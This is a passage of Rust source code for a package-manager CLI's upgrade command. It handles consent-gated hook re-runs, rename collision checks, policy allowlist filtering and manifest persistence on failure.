        // items it would have contributed were never compared. Report the
        // sources that could not be checked instead of the plain up-to-date line.
        if !unscannable.is_empty() {
            if out.json {
                let mut result = MutationResult::new("upgrade", target, "incomplete");
                result.count = Some(unscannable.len());
                return Ok(Some(with_profiles(result)));
            }
            println!(
                "no pending upgrades among the source(s) that could be checked; {} source(s) could not be checked: {}",
                unscannable.len(),
                unscannable.join(", ")
            );
            return Ok(None);
        }
        if out.json {
            return Ok(Some(with_profiles(MutationResult::new(
                "upgrade",
                target,
                "up-to-date",
            ))));
        }
        println!("everything is up to date");
        return Ok(None);
    }

    if !out.json {
        print_upgrade_report(paths, &registry, &pending, &tracking);
        print_whole_additions(&whole);
        print_prunes(&prunes);
        print_left_prunes(&left_prunes);
    }

    validate_upgrade_collisions(&pending, &manifest)?;

    if !yes {
        // spec: LIFE-45 -- B1: `--json` is non-interactive (mirrors DEP-60): a
        // `--json` run without `--yes` refuses instead of silently applying the
        // upgrades. Unlike DEP-60's own gate, this does NOT also require a real
        // TTY: the text-mode prompt below reads stdin directly and already
        // treats EOF/no-input as a safe decline (`read_confirm`), so a
        // non-interactive *text*-mode run (e.g. piped stdin with no reply) was
        // never able to apply an upgrade unprompted -- only `--json` could
        // bypass it, by skipping the confirm call entirely.
        // spec: CLI-233 CLI-234 CLI-235 -- a filter (`sync <filter> --upgrade`,
        // or `upgrade <item>`) can match more sources than the caller
        // pictured; when it matched more than one, `multi_source_note` (built
        // above, and already disclosed once -- stdout in text mode, stderr
        // under `--json` -- before `rerun_source_hooks` ran) names them. The
        // `!yes` `--json` refusal still folds the SAME note into
        // `ConfirmationRequired.action`, so a `--json` caller without `--yes`
        // sees it there too, alongside the earlier stderr disclosure. Text
        // mode does NOT print it again here: CLI-235 already printed it once,
        // above, before the hooks it warns about ran.
        if out.json {
            // spec: CLI-232 CLI-233 CLI-234 CLI-235
            let action = match &multi_source_note {
                Some(note) => {
                    json_confirmation_action(format!("applying pending upgrades ({note})"), true)
                }
                None => json_confirmation_action("applying pending upgrades", true),
            };
            return Err(MindError::ConfirmationRequired { action });
        }
    }
    // spec: HOOK-180 HOOK-184 -- the plan lists the source hooks, then each
    // pending item's hooks: its build and install (or update, HOOK-125) hooks,
    // and for a rename the old item's uninstall hooks (HOOK-82).
    let mut hooks = source_plan;
    for up in &pending {
        let is_update = up.new_name == up.old.name;
        hooks.extend(item_install_plan(
            paths, &registry, &up.cat, is_update, accept,
        ));
        if !is_update {
            hooks.extend(item_uninstall_plan(
                paths,
                &up.old,
                &up.cat.uninstall_hooks(),
                &up.old.commit,
                accept,
            ));
        }
    }
    // spec: PROF-39 HOOK-180 -- a leftover is still offered, so its uninstall
    // hooks run and are planned with the rest.
    let left_hooks: Vec<Vec<&crate::mindfile::ResolvedHook>> = left_prunes
        .iter()
        .map(|item| {
            item_catalog_match(&catalog, item)
                .map(|c| c.uninstall_hooks())
                .unwrap_or_default()
        })
        .collect();
    // The hooks are read from the source's current catalog, so the plan names
    // its current commit, as the run below and `forget` do.
    for (item, item_hooks) in left_prunes.iter().zip(&left_hooks) {
        let commit = registry
            .find(&item.source)
            .and_then(|s| s.commit.clone())
            .unwrap_or_default();
        hooks.extend(item_uninstall_plan(
            paths, item, item_hooks, &commit, accept,
        ));
    }
    // spec: HOOK-198 -- last, the items hooks, in the order the settle offers
    // them: every one of a source this pass changes, and the pending ones of
    // any other source in scope.
    let touched: HashSet<&str> = pending
        .iter()
        .map(|up| up.cat.source.as_str())
        .chain(prunes.iter().map(|it| it.source.as_str()))
        .chain(left_prunes.iter().map(|it| it.source.as_str()))
        .collect();
    let scoped = sources_in_scope(&registry, hook_scope.as_ref());
    for source in &registry.sources {
        let when = if touched.contains(source.name.as_str()) {
            crate::items_hook::PlanWhen::Touched
        } else if scoped.contains(&source.name) {
            crate::items_hook::PlanWhen::Pending
        } else {
            continue;
        };
        hooks.extend(crate::items_hook::planned(
            paths,
            &registry,
            [source.name.as_str()],
            when,
            accept,
        ));
    }
    // spec: CLI-60 CLI-259 HOOK-182 -- without `--yes` the upgrades are
    // confirmed with the hooks (off a TTY that refuses); `--yes` answers the
    // items, leaving a hooks-only plan.
    let items = (!yes).then(|| PlanItems {
        question: "apply these upgrades?",
        always: true,
        default_yes: true,
        removal: false,
        listing: Vec::new(),
    });
    match ask_plan(paths, items, hooks)? {
        PlanOutcome::Proceed => {}
        PlanOutcome::Cancel | PlanOutcome::Abort => {
            println!("aborted; nothing changed");
            return Ok(None);
        }
    }
    // spec: HOOK-183 -- the source hooks run after the answer, before items.
    rerun_source_hooks(
        paths,
        &mut registry,
        accept,
        hook_scope.as_ref(),
        policy.as_ref(),
    )?;

    let mut manifest = manifest;
    let mut applied: Vec<String> = Vec::new();
    // The manifest keys (`kind:name`) of what this pass installed, as `learn`
    // collects them: `applied` holds DISPLAY keys, which do not index the
    // manifest. A rename (a prefix change) records the NEW key, since the old
    // entry is gone by the time the warnings run.
    let mut applied_keys: Vec<String> = Vec::new();
    let mut renamed = false;
    for up in &pending {
        let siblings = siblings_of(&catalog, &up.cat.source);
        // Build the new version first; the old copy is preserved until this
        // succeeds (transactional install). An upgrade never force-overwrites a
        // foreign target; that is for an explicit `learn --force`.
        //
        // spec: LIFE-48 -- H3: a failure partway through this batch must not
        // lose the manifest state for items already upgraded on disk (mirrors
        // `learn`/`forget`, which deliberately save on their failure path).
        // Each fallible step below therefore saves whatever has been applied
        // so far before propagating, instead of letting `?` unwind straight
        // out of the loop with an unsaved manifest.
        // spec: LNK-18 -- reconcile a link instance's unsatisfiable references
        // here too, so an upstream edit that adds a `requires` entry does not
        // turn every later `upgrade` of that link into a hard failure.
        let (cat, dropped_requires) = match link_reconciled(paths, &registry, &up.cat) {
            Ok(c) => c,
            Err(e) => {
                save_and_warn_workflows(paths, &manifest, &applied_keys);
                return Err(e);
            }
        };
        // spec: HOOK-125 -- an in-place upgrade re-installs over the existing
        // install, so the item's update hooks (if any) replace its install
        // hooks. A rename (a prefix change) is not: the old item is removed
        // with its uninstall hooks and the new name is a first install.
        let is_update = up.new_name == up.old.name;
        let mut installed = match install_item(
            paths,
            &cat,
            &up.new_commit,
            &siblings,
            false,
            accept,
            is_update,
        ) {
            Ok(mut i) => {
                // spec: LNK-19 -- carry the LNK-18 drop record across the
                // upgrade too, so it reflects the version now on disk (an
                // upstream edit may have added or removed such an entry).
                i.dropped_requires = dropped_requires;
                i.version = release_version(&registry, &i);
                // spec: PROF-20 -- the install path builds a fresh entry, so
                // the old one's install reasons are carried over by hand.
                crate::profile::carry_reasons(&mut i, &up.old);
                i
            }
            Err(e) => {
                // spec: LIFE-48 -- persist what earlier items applied, but do not
                // let a save failure mask the root cause `e`.
                save_and_warn_workflows(paths, &manifest, &applied_keys);
                return Err(e);
            }
        };
        if up.new_name != up.old.name {
            // Rename: drop the old item (by its file registry) and re-key. The OLD
            // item is removed, so its uninstall hook fires (HOOK-82); the new
            // item's install hook already ran in install_item above.
            //
            // spec: LIFE-47 -- B3: strip any link the new install already owns
            // before removing the old ones. Agents link under the bare harness
            // name (NS-40) regardless of the item's effective name, so a
            // prefix-only rename can produce `old.links == installed.links`;
            // removing them unfiltered would delete the link the new install
            // just created, leaving the manifest claiming a link that no
            // longer exists (mirrors the in-place branch below).
            let mut old_for_uninstall = up.old.clone();
            old_for_uninstall
                .links
                .retain(|l| !installed.links.contains(l));
            if let Err(e) = uninstall_item(
                paths,
                &old_for_uninstall,
                &up.cat.uninstall_hooks(),
                &up.old.commit,
                accept,
            ) {
                // The new copy is already live on disk (install_item succeeded
                // above); record it before propagating. Recording it keeps the
                // manifest matching disk and makes it visible to `hooks run`
                // (HOOK-110); a later `upgrade` retry still re-runs install_item
                // (install hooks included), which is why the record is safe to
                // leave. The old key is left in place (it was never removed), so
                // both entries are recorded until this is resolved.
                applied_keys.push(installed.key().into());
                manifest.insert(installed);
                // spec: LIFE-48 -- a save failure here must not mask `e`.
                save_and_warn_workflows(paths, &manifest, &applied_keys);
                return Err(e);
            }
            manifest.items.remove(up.old.key().as_str());
            renamed = true;
            if !out.json {
                println!(
                    "{} upgraded {} -> {}",
                    out.ok(),
                    up.old.display_key(),
                    out.green(&installed.display_key())
                );
            }
        } else {
            // In-place upgrade (same effective name, so not a rename). The link
            // set can still change when an agent's harness name (its frontmatter
            // `name`, NS-40) changed: the new copy links under the new bare name,
            // so remove any old link the new install no longer owns, leaving no
            // orphaned symlink behind.
            let mut kept: Vec<String> = Vec::new();
            for old_link in &up.old.links {
                if installed.links.contains(old_link) {
                    continue;
                }
                let old_path = std::path::Path::new(old_link);
                // spec: LIFE-59 LIFE-44 -- journaled, so a rollback restores
                // the link along with the old store copy, and confined like
                // uninstall's removals.
                match install::remove_recorded_link(paths, &up.old, old_path) {
                    Ok(()) => continue,
                    // spec: LOBE-6 -- a stale link in a lobe that cannot be
                    // written stays recorded, so a run that can write there
                    // removes it.
                    Err(e) if e.is_unwritable() => {
                        install::note_unwritable_lobe_once(old_path.parent().unwrap_or(old_path));
                        kept.push(old_link.clone());
                        continue;
                    }
                    Err(e) => {
                        applied_keys.push(installed.key().into());
                        manifest.insert(installed);
                        // spec: LIFE-48 -- a save failure here must not mask `e`.
                        save_and_warn_workflows(paths, &manifest, &applied_keys);
                        return Err(e);
                    }
                }
            }
            installed.links.extend(kept);
            // spec: HOME-8 -- an item kept by `unmeld --keep-items` and
            // re-melded into another home moves there on its next upgrade.
            if let Err(e) = install::remove_moved_store(paths, &up.old, &installed) {
                applied_keys.push(installed.key().into());
                manifest.insert(installed);
                save_and_warn_workflows(paths, &manifest, &applied_keys);
                return Err(e);
            }
            if !out.json {
                println!(
                    "{} upgraded {}",
                    out.ok(),
                    out.green(&installed.display_key())
                );
            }
        }
        // spec: DSC-95
        applied.push(installed.display_key());
        applied_keys.push(installed.key().into());
        manifest.insert(installed);
    }
    // spec: LIFE-57 -- after the upgrades, under the same answer. An item's
    // uninstall hooks are read from its source's catalog, which no longer
    // lists it, so none run, as with `forget` of a dropped item.
    let mut pruned: Vec<String> = Vec::new();
    for item in &prunes {
        let commit = registry
            .find(&item.source)
            .and_then(|s| s.commit.clone())
            .unwrap_or_default();
        if let Err(e) = uninstall_item(paths, item, &[], &commit, accept) {
            save_and_warn_workflows(paths, &manifest, &applied_keys);
            return Err(e);
        }
        manifest.items.remove(item.key().as_str());
        let key = item.display_key();
        if !out.json {
            println!("{} pruned {key}", out.ok());
        }
        pruned.push(key);
    }
    // spec: PROF-39 -- the profile leftovers, under the same answer; each is
    // still offered, so its uninstall hooks run.
    for (item, item_hooks) in left_prunes.iter().zip(&left_hooks) {
        let commit = registry
            .find(&item.source)
            .and_then(|s| s.commit.clone())
            .unwrap_or_default();
        if let Err(e) = uninstall_item(paths, item, item_hooks, &commit, accept) {
            save_and_warn_workflows(paths, &manifest, &applied_keys);
            return Err(e);
        }
        manifest.items.remove(item.key().as_str());
        let key = item.display_key();
        if !out.json {
            println!("{} pruned {key}", out.ok());
        }
        pruned.push(key);
    }
    manifest.save(paths)?;
    // spec: WF-24 WF-29 WF-30 WF-31 -- the same post-install warnings `learn`
    // emits, on the same terms: after the manifest is written, so they read the
    // store copies and compare against the whole installed set. Advisory only:
    // an upgrade is never failed or altered by one.
    warn_workflows(paths, &manifest, &applied_keys);
    // spec: PROF-21 -- the profile additions install under the same gate,
    // through the learn path (so the dependency closure applies), and are
    // tagged and snapshotted as they land.
    for (source_name, plan) in &tracking.plans {
        let flow = InstallFlow {
            yes: true,
            clobber: Clobber::Prompt,
            accept,
        };
        let keys = apply_profile_plan(paths, source_name, plan, flow, out.json)?;
        applied.extend(keys.iter().map(|k| strip_ansi(k)));
    }
    // spec: LIFE-54 -- the same for items new to a source installed whole.
    if !whole.targets.is_empty() {
        let flow = InstallFlow {
            yes: true,
            clobber: Clobber::Prompt,
            accept,
        };
        let keys = apply_whole_additions(paths, &whole, flow, out.json)?;
        applied.extend(keys.iter().map(|k| strip_ansi(k)));
    }
    if out.json {
        // spec: LIFE-58
        let outcome = if renamed {
            "renamed"
        } else if applied.is_empty() && !pruned.is_empty() {
            "pruned"
        } else {
            "upgraded"
        };
        let mut result = MutationResult::new("upgrade", target, outcome);
        result.installed = applied;
        result.removed = pruned;
        return Ok(Some(with_profiles(result)));
    }
    Ok(None)
}

/// HOOK-11, HOOK-55, HOOK-121: run each source's pending hooks for an update.
///
/// Which hooks those are depends on the source (HOOK-122): a source that
/// declares any `event = "update"` hook offers its pending UPDATE hooks and does
/// not re-run its install hooks; one that declares none re-offers its pending
/// install hooks, as before. Pending means the same thing for both (HOOK-55,
/// HOOK-124): a recorded run-commit that is absent or behind the source's
/// current commit.
///
/// Same trust boundary as `meld`: prompt and disclose, unless
/// `--accept-hooks` is set or there is no TTY. In
/// `upgrade`, Abort is treated as Skip: the source is already registered, so
/// declining the re-run just leaves the existing install in place. Persists the
/// registry only if a hook was run and its recorded commit advanced.
// spec: HOOK-121 HOOK-122 HOOK-124
pub(super) fn rerun_source_hooks(
    paths: &Paths,
    registry: &mut Registry,
    accept: crate::hook::Accept,
    in_scope: Option<&HashSet<String>>,
    policy: Option<&Policy>,
) -> Result<()> {
    let mut changed = false;
    for source in &mut registry.sources {
        let dir = source.clone_dir(paths);
        let pending = pending_update_hooks(source, &dir);
        if pending.hooks.is_empty() {
            continue;
        }
        // HOOK-11 scope: a scoped `upgrade <item>` restricts the hook re-run to
        // sources implicated by the filter. `None` = unscoped (all sources).
        if let Some(scope) = in_scope
            && !scope.contains(&source.name)
        {
            continue;
        }
        // POL-12: with the allowlist locked, do not re-run the install hook
        // (arbitrary code) for a source whose identity is no longer allowed;
        // report and skip it, exactly as the per-item loop does.
        if let Some(policy) = policy
            && policy.lock()
            && !policy.allow_matches(&source.base_identity())
        {
            if !json_mode() {
                println!(
                    "skipping {} hook for {}: source not permitted by the managed policy's allowlist",
                    pending.event, source.name
                );
            }
            continue;
        }

        let event = pending.event;
        let recorded_event = pending.recorded_event;
        let pin_desc = pin_description(&source.pin);
        let commit = source.commit.clone().unwrap_or_default();
        let clone_path = dir.display().to_string();

        for hook in pending.hooks {
            let run = if accept.event_str(event) {
                // HOOK-23: re-run without prompting.
                if !json_mode() {
                    println!(
                        "note: running {event} hook for {} without the safety prompt (--accept-hooks)",
                        source.name
                    );
                }
                true
            } else if !crate::hook::is_tty() {
                // HOOK-22: no TTY; never run silently. Skip the re-run.
                if !json_mode() {
                    println!(
                        "note: skipped the {event} hook for {} (no TTY); its tooling may be out of date until the hook is run",
                        source.name
                    );
                }
                false
            } else if let Some(
                answer @ (crate::consent::Answer::RunAll | crate::consent::Answer::SkipAll),
            ) = crate::consent::answer_for(&crate::consent::HookKey::source_hook(
                &source.name,
                event,
                &hook.run,
            )) {
                // spec: HOOK-181 HOOK-183 -- the upgrade plan listed this hook.
                answer == crate::consent::Answer::RunAll
            } else {
                // spec: HOOK-24 - show a browse URL pinned to the disclosed commit.
                let browse_url = source.browse_url(&commit);
                let disclosure = crate::hook::hook_disclosure_text(
                    &hook.label,
                    event,
                    hook.optional,
                    &source.name,
                    &pin_desc,
                    &commit,
                    &clone_path,
                    &hook.run,
                    hook.declared_override().as_deref(),
                    browse_url.as_deref(),
                );
                // Abort is treated as Skip here (the source is already
                // registered, per the HOOK-11 note), so both prompts have the
                // same two outcomes; the optional/required distinction still
                // decides the prompt's shape and how the hook is disclosed
                // (HOOK-52), which is why `optional` is carried from the
                // declaration rather than assumed.
                if hook.optional {
                    matches!(
                        crate::hook::prompt_choice_optional(&disclosure)?,
                        crate::hook::OptionalChoice::Run
                    )
                } else {
                    matches!(
                        crate::hook::prompt_choice(&disclosure)?,
                        crate::hook::HookChoice::RunAndContinue
                    )
                }
            };

            let site = crate::hook_log::Site {
                item: None,
                commit: Some(commit.as_str()),
                replaced: &hook.replaced,
            };
            if !run {
                // spec: HOOK-160
                crate::hook_log::not_run(&source.name, site, event, &hook.label, &hook.run);
            }
            if run {
                // HOOK-30: a non-zero exit is a hard error. The source stays
                // registered; just propagate the failure.
                //
                // spec: LIFE-48 -- H3: persist any hook runs already recorded
                // in this pass before propagating, so an earlier source's
                // successful re-run is not lost (and its side effect not
                // silently re-offered on the next pass).
                let hook_env = source_hook_env(source);
                if let Err(e) = crate::hook::run_hook(
                    &hook.run,
                    &dir,
                    &source.name,
                    event,
                    &hook.label,
                    &hook_env,
                    site,
                ) {
                    if changed {
                        registry.save(paths)?;
                    }
                    return Err(e);
                }
                // HOOK-55, HOOK-124: record the commit the hook ran at. An
                // update hook shares the install hooks' recorded set, but not
                // their key: the record is keyed by (command, event), so a run
                // of one event never settles the other.
                let ran_at = source.commit.clone();
                record_install_hook(source, &hook.run, recorded_event, ran_at);
                changed = true;
                if !json_mode() {
                    println!("ran {event} hook for {}", source.name);
                }
            }
        }
    }
    if changed {
        registry.save(paths)?;
    }
    Ok(())
}

/// The plan entries for the source hooks [`rerun_source_hooks`] would offer
/// (HOOK-180, HOOK-183): the same pending selection, scope, and policy filter,
/// so the plan lists exactly the hooks the pass then runs or skips.
fn source_hooks_plan(
    paths: &Paths,
    registry: &Registry,
    accept: crate::hook::Accept,
    in_scope: Option<&HashSet<String>>,
    policy: Option<&Policy>,
) -> Vec<crate::consent::PlannedHook> {
    let mut plan = Vec::new();
    for source in &registry.sources {
        if in_scope.is_some_and(|scope| !scope.contains(&source.name)) {
            continue;
        }
        if policy.is_some_and(|p| p.lock() && !p.allow_matches(&source.base_identity())) {
            continue;
        }
        let dir = source.clone_dir(paths);
        let pending = pending_update_hooks(source, &dir);
        let commit = source.commit.clone().unwrap_or_default();
        for hook in pending.hooks {
            plan.push(crate::consent::PlannedHook {
                key: crate::consent::HookKey::source_hook(&source.name, pending.event, &hook.run),
                label: hook.label.clone(),
                optional: hook.optional,
                commit: commit.clone(),
                run_dir: dir.display().to_string(),
                inspect: None,
                browse_url: source.browse_url(&commit),
                replaced: hook.declared_override(),
                accepted: accept.event_str(pending.event),
            });
        }
    }
    plan
}

/// One hook `upgrade` should offer for a source, resolved to what the run and
/// the disclosure need.
pub(super) struct UpgradeHook {
    pub(super) run: String,
    pub(super) label: String,
    pub(super) optional: bool,
    /// The declared command(s) a consumer `--install-hook` override replaced,
    /// for the loud override note in the disclosure (HOOK-56) and the hook's
    /// record (HOOK-160). Empty when this is not an overriding hook.
    pub(super) replaced: Vec<String>,
}

impl UpgradeHook {
    /// The disclosure's override note: the replaced commands, joined.
    pub(super) fn declared_override(&self) -> Option<String> {
        (!self.replaced.is_empty()).then(|| self.replaced.join("; "))
    }
}

/// The hooks `upgrade` should offer for one source, and the event they belong
/// to (HOOK-121, HOOK-122).
pub(super) struct PendingUpgradeHooks {
    /// The event's name, for the disclosure and the notes.
    pub(super) event: &'static str,
    /// The same event, for the run record's key (HOOK-124).
    pub(super) recorded_event: RecordedEvent,
    pub(super) hooks: Vec<UpgradeHook>,
}

/// Select the hooks an `upgrade` offers for `source`, whose clone is at
/// `clone_dir` (HOOK-122). I/O wrapper around [`select_upgrade_hooks`]: reads
/// the clone's `mind.toml` and hands the selector what it declares.
///
/// A clone that cannot be read, or whose manifest does not parse, declares
/// nothing. That is deliberately fail-closed on BOTH branches: no update hook
/// is offered, and no recorded install hook is replayed either, since a record
/// alone cannot show that the source still stands behind the command (HOOK-55).
/// `upgrade` reports the broken source through the scan below.
// spec: HOOK-121 HOOK-122 HOOK-124
pub(super) fn pending_update_hooks(
    source: &crate::source::Source,
    clone_dir: &std::path::Path,
) -> PendingUpgradeHooks {
    let loaded = MindToml::load(clone_dir).ok().flatten();
    let has_manifest = loaded.as_ref().is_some_and(|m| m.gates_curated_config());
    let declared = loaded
        .map(|mf| {
            mf.resolved_hooks(&clone_dir.join("mind.toml"))
                .unwrap_or_default()
        })
        .unwrap_or_default();
    select_upgrade_hooks(source, &declared, has_manifest)
}

/// The pure hook selection behind [`pending_update_hooks`] (HOOK-122).
///
/// A source that has any update hook in effect offers its pending update hooks
/// and none of its install hooks; one that has none re-offers its pending
/// recorded install hooks (HOOK-11/55), the unchanged behavior for every source
/// that has not opted in.
///
/// "In effect" is the clone's declared update hooks (`declared`) plus the
/// curated `[[discover.sources.hooks]]` update entries recorded on the source
/// (HOOK-127) -- those live in the parent super-source's manifest, so the clone
/// can never be asked about them -- and, when the consumer melded with
/// `--install-hook`, that override replaces the lot (HOOK-56: the override
/// covers the install AND the update event, so a source cannot escape it by
/// moving the command to `event = "update"`).
///
/// `has_manifest` is the DSC-60 gate: once the source's own `mind.toml`
/// declares its own discovery or hooks, curated values stop applying to it.
// spec: HOOK-56 HOOK-121 HOOK-122 HOOK-124 HOOK-127
fn select_upgrade_hooks(
    source: &crate::source::Source,
    declared: &[crate::mindfile::ResolvedHook],
    has_manifest: bool,
) -> PendingUpgradeHooks {
    let current = source.commit.as_deref();
    let keep_curated = !has_manifest;

    // The update hooks in effect: declared first, then curated (the meld order).
    let mut updates: Vec<UpgradeHook> = declared
        .iter()
        .filter(|h| h.event == HookEvent::Update)
        .map(|h| UpgradeHook {
            run: h.run.clone(),
            label: h.label().to_string(),
            optional: h.optional,
            replaced: Vec::new(),
        })
        .collect();
    if keep_curated {
        updates.extend(
            source
                .install_hooks
                .iter()
                .filter(|r| r.origin == Some(HookOrigin::Curated))
                .filter(|r| r.event() == RecordedEvent::Update)
                .map(|r| UpgradeHook {
                    run: r.command.clone(),
                    label: r.label().to_string(),
                    optional: r.optional,
                    replaced: Vec::new(),
                }),
        );
    }

    if !updates.is_empty() {
        // HOOK-56: the consumer's command replaces every update hook, and says
        // so loudly, exactly as it does at meld for the install event.
        if let Some(cmd) = source.override_command() {
            let replaced: Vec<String> = updates.iter().map(|h| h.run.clone()).collect();
            updates = vec![UpgradeHook {
                run: cmd.to_string(),
                label: cmd.to_string(),
                optional: false,
                replaced,
            }];
        }
        updates.retain(|h| !hook_ran_at(source, &h.run, RecordedEvent::Update, current));
        return PendingUpgradeHooks {
            event: RecordedEvent::Update.as_str(),
            recorded_event: RecordedEvent::Update,
            hooks: updates,
        };
    }

    // No update hooks: re-offer the pending recorded install hooks, recovering
    // each one's label and `optional` flag from what the source declares now.
    // The record carries neither (a name is not part of a command's identity),
    // so building the disclosure from the record alone would rename the
    // author's hook to its raw command and call an optional hook required.
    let declared_install: Vec<String> = declared
        .iter()
        .filter(|h| h.event == HookEvent::Install)
        .map(|h| h.run.clone())
        .collect();
    PendingUpgradeHooks {
        event: RecordedEvent::Install.as_str(),
        recorded_event: RecordedEvent::Install,
        hooks: source
            .pending_install_hooks(current, &declared_install, keep_curated)
            .into_iter()
            .map(|r| {
                let decl = declared
                    .iter()
                    .find(|h| h.event == HookEvent::Install && h.run == r.command);
                // HOOK-56: an overriding command keeps its loud note here too,
                // naming what the source declares in its place.
                let replaced = if r.origin == Some(HookOrigin::Override) {
                    declared_install.clone()
                } else {
                    Vec::new()
                };
                UpgradeHook {
                    run: r.command.clone(),
                    label: decl
                        .map(|d| d.label())
                        .unwrap_or_else(|| r.label())
                        .to_string(),
                    optional: decl.map(|d| d.optional).unwrap_or(r.optional),
                    replaced,
                }
            })
            .collect(),
    }
}

/// Refuse upgrade renames that would collide with installed or pending items.
fn validate_upgrade_collisions(pending: &[Upgrade], manifest: &Manifest) -> Result<()> {
    // spec: LIFE-46 CLI-232 -- these two collision checks used to run BEFORE
    // the pending report above, so a batch that hit either collision aborted
    // with no visibility into what else was pending. They now run after the
    // report so a human run always sees the full pending list first, even
    // when it then aborts. Both raise `UpgradeRenameCollision`, which (unlike
    // `AmbiguousItem`) names the collision explicitly and states both real
    // remedies (`mind forget`, re-namespace with `mind meld -N`) rather than
    // phrasing it as a "query" the user never typed with no next step.
    for up in pending {
        if up.new_name == up.old.name {
            continue;
        }
        // `up.new_name` is the bare effective name (`CatalogItem::effective_name`);
        // the manifest is keyed `kind:name` (`InstalledItem::key`), so the lookup
        // key must carry the kind prefix too.
        let new_key = format!("{}:{}", up.old.kind.as_str(), up.new_name);
        if let Some(occupant) = manifest.items.get(&new_key) {
            let same_identity = occupant.kind == up.old.kind
                && occupant.bare_name == up.old.bare_name
                && occupant.source == up.old.source;
            if !same_identity {
                // spec: DSC-95 -- sanitize each field passed into the
                // error before it is embedded in the (source-controlled-name
                // carrying) Display message.
                return Err(MindError::UpgradeRenameCollision {
                    key: strip_ansi(&new_key),
                    existing_source: strip_ansi(&occupant.source),
                    incoming: strip_ansi(up.old.key().as_str()),
                    incoming_source: strip_ansi(&up.old.source),
                });
            }
        }
    }

    // spec: LIFE-46 -- the guard above compares each rename against the
    // PRE-EXISTING manifest, but two pending items in ONE batch can converge on
    // the same target key when neither key is occupied yet (each source drops
    // its prefix in the same upgrade). The first install then becomes the
    // second's "previous version" and is evicted silently. Detect a duplicate
    // target key WITHIN `pending` too (verified: sources `jx:review` and
    // `jy:review` both dropping their prefixes). The result key of an item that
    // is not renaming is its unchanged key, so a rename colliding with a
    // non-renaming sibling is caught as well.
    {
        use std::collections::HashMap;
        let mut seen: HashMap<String, &Upgrade> = HashMap::new();
        for up in pending {
            let key = format!("{}:{}", up.old.kind.as_str(), up.new_name);
            if let Some(prev) = seen.get(&key) {
                let same_identity = prev.old.kind == up.old.kind
                    && prev.old.bare_name == up.old.bare_name
                    && prev.old.source == up.old.source;
                if !same_identity {
                    // spec: DSC-95
                    return Err(MindError::UpgradeRenameCollision {
                        key: strip_ansi(&key),
                        existing_source: strip_ansi(&prev.old.source),
                        incoming: strip_ansi(up.old.key().as_str()),
                        incoming_source: strip_ansi(&up.old.source),
                    });
                }
            } else {
                seen.insert(key, up);
            }
        }
    }

    Ok(())
}

/// What `upgrade` should do with one installed item before the catalog lookup.
#[derive(Debug, PartialEq, Eq)]
enum UpgradeDisposition {
    /// The item is outside the scoped item-ref selection: skip silently.
    OutOfScope,
    /// In scope, but its source is barred by the locked policy allowlist
    /// (POL-12): print a skip line.
    PolicyBlocked,
    /// In scope, under a locked policy, but its recorded source name matches
    /// no registered source at all (spec: POL-69): print a skip line that
    /// says so, distinct from `PolicyBlocked`. The item is still not
    /// upgraded (fail closed, POL-68), but the reason is that the source was
    /// unmelded, not that it fell outside the allowlist.
    SourceNotRegistered,
    /// In scope and permitted: consider it for an upgrade.
    Consider,
}

/// The identity to match a *recorded* source name against the managed policy
/// allowlist (spec: POL-67).
///
/// A name recorded on an installed item or an install target is an instance
/// identity, which may carry an item-link `#path` and/or a consumer `@alias`
/// suffix. The allowlist matches the base `host/owner/repo`, and the only
/// sound way to recover that from a name is structurally, through the
/// registered source itself; scanning the string for the first `#`/`@` is a
/// policy bypass (POL-68).
///
/// A name with no registered source has no structural base identity, so it is
/// returned unchanged and will simply fail to match (fail closed). That state
/// means an installed item outlived its source, which `introspect` reports.
pub(super) fn policy_identity(registry: &Registry, source_name: &str) -> String {
    registry
        .find(source_name)
        .map(|s| s.base_identity())
        .unwrap_or_else(|| source_name.to_string())
}

/// Decide an installed item's `upgrade` disposition. The item-ref filter and
/// the source scope are both applied first (POL-12 ordering fix, CLI-232): a
/// scoped `upgrade <item>` or a scoped `sync <source> --upgrade` must not emit
/// policy-skip lines for sources the user never selected. The policy block is
/// only ever reported for items that passed both filters.
fn upgrade_item_disposition(
    installed: &crate::manifest::InstalledItem,
    filter: Option<&crate::resolve::ItemRef>,
    // spec: CLI-232 -- H2 fix: `sync <source> --upgrade`'s source scope. `None`
    // means every source is in scope (the unscoped `mind upgrade` behavior is
    // unchanged); `Some(set)` restricts consideration to installed items whose
    // recorded source name is in `set`, exactly like `filter` restricts by item.
    source_scope: Option<&HashSet<String>>,
    // spec: TUI-72 TUI-73 - the TUI's confirmed-set apply scope: `None` means
    // unrestricted by key (every non-TUI caller); `Some(set)` restricts
    // consideration to installed items whose exact key (`kind:name`) is in
    // `set`, so `UpgradeOpts::keys` acts on precisely the confirmed items.
    key_scope: Option<&HashSet<String>>,
    policy: Option<&Policy>,
    registry: &Registry,
) -> UpgradeDisposition {
    if let Some(f) = filter
        && !crate::resolve::installed_matches_glob(installed, f)
    {
        return UpgradeDisposition::OutOfScope;
    }
    if let Some(scope) = source_scope
        && !scope.contains(&installed.source)
    {
        return UpgradeDisposition::OutOfScope;
    }
    if let Some(scope) = key_scope
        && !scope.contains(installed.key().as_str())
    {
        return UpgradeDisposition::OutOfScope;
    }
    if let Some(policy) = policy
        && policy.lock()
    {
        // spec: POL-69 -- distinguish "no registered source has this name"
        // (POL-68's fail-closed fallback: no base pattern can admit the
        // recorded name verbatim) from "a registered source's base identity
        // is outside the allowlist". Both still refuse the upgrade, but only
        // the latter is actually a policy-allowlist decision.
        if registry.find(&installed.source).is_none() {
            return UpgradeDisposition::SourceNotRegistered;
        }
        if !policy.allow_matches(&policy_identity(registry, &installed.source)) {
            return UpgradeDisposition::PolicyBlocked;
        }
    }
    UpgradeDisposition::Consider
}

/// Warn about a compatible release move that looks breaking (VER-65): it
/// drops an installed item, changes an installed item's kind, or removes the
/// referent of a `{{ns:}}` token in an installed item. Advisory: the upgrade
/// carries on. `scope` limits it to the sources the pass touches.
// spec: VER-65
fn warn_apparent_breaks(
    registry: &Registry,
    manifest: &Manifest,
    catalog: &[CatalogItem],
    scope: Option<&HashSet<String>>,
    // spec: LIFE-58 -- items this pass prunes (LIFE-57): their drop is
    // handled, so it is neither warned about nor hinted at.
    prunes: &[crate::manifest::InstalledItem],
    out: &crate::render::OutputCtx,
) {
    let mut any_drop = false;
    for source in &registry.sources {
        let Pin::Version(vp) = &source.pin else {
            continue;
        };
        if scope.is_some_and(|s| !s.contains(&source.name)) {
            continue;
        }
        let (Some(to), Some(commit)) = (vp.resolved.as_deref(), source.commit.as_deref()) else {
            continue;
        };
        let installed: Vec<&crate::manifest::InstalledItem> = manifest
            .items
            .values()
